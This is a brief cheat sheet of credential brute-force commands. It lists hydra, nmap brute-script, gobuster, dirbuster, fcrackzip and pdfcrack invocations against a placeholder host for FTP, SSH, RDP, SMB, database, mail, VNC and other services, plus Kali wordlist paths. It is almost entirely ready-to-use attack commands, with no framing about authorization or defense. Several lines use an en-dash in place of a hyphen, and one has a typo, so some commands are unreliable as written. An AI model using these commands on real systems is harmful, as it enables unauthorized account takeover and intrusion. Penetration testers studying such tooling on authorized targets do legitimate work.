BRUTE FORCE YOUR WAY IN

Below are some good sources for wordlists and brute force tool examples

Kali Linux!

You can get Kali Linux from here. Kali contains a number of toolsets ready to use and a large number of wordlists which can be found in the following directory:

/usr/share/wordlists/

FTP brute force example

hydra -l root -P passwords.txt [-t 32] 10.0.0.1 ftp

HTTP Basic Auth brute force example

hydra -L /path/to/users.txt -P /path/to/password.txt 10.0.0.1 http-get /

Gobuster brute forcing URIs

gobuster -v -u https://wesitename -w /path/to/dictionary

Kali has good dictionaries in /usr/share/wordlists/

Dirbuster GUI brute forcing URIs

To get a GUI version of gobuster use the command:

root@kali:~# dirbuster

IRC brute force example

nmap -sV --script irc-brute,irc-sasl-brute --script-args userdb=/path/to/userlist.txt,passdb=/path/to/passwordlist.txt -p PORT 10.0.0.1

LDAP brute force example

nmap --script ldap-brute -p 389 10.0.0.1

MySQL brute force example

hydra -L users.txt -P passwords.txt 10.0.0.1 mysql

POP3 brute force example

hydra -l username -P /path/to/passwords.txt -f 10.0.0.1 pop3 -V

PostgreSQL brute force example

hydra -L /path/to/user.txt –P /path/to/passwords.txt 10.0.0.1 postgres

RDP brute force example

hydra -V -f -L users.txt -P passwords.txt rdp://10.0.0.1

Redis brute force example

hydra –P /path/to/passwords.txt 10.0.0.1 redis

Rlogin brute force example

hydra -l username -P /path/to/passwords.txt rlogin://10.0.0.1 -v -V

RTSP brute force example

hydra -l root -P passwords.txt 10.0.0.1 rtsp

SNMP brute force example

hydra -P /path/to/community-strings.txt 10.0.0.1 snmp

SMB brute force example

hydra -l Administrator -P passwords.txt 10.0.0.1 smb -t 1

SMTP brute force example

hydra -l username -P /path/to/passwords.txt 10.0.0.1 smtp -V

SMTP SSL brute force example

hydra -l username -P /path/to/passwords.txt -s 587 10.0.0.1 -S -v -V

SQL brute force example

hydra -L /path/to/users.txt –P /path/to/passwords.txt 10.0.0.1 mssql

SSH brute force example

hydra -l root -P passwords.txt [-t 32] 10.0.0.1 ssh

TELNET brute force example

hydra -l root -P passwords.txt [-t 32] 10.0.0.1 telnet

VNC brute force example

hydra -L /path/to/users.txt –P /path/to/passwords.txt -s PORT 10.0.0.1 vnc

ZIP brute force example

fcrackzip -u -v -D -p '/path/to/passwords.txt' passwordprotected.zip

PDF brute force example

pdfcrack passwordprotected.pdf -w /path/to/passwords.txt
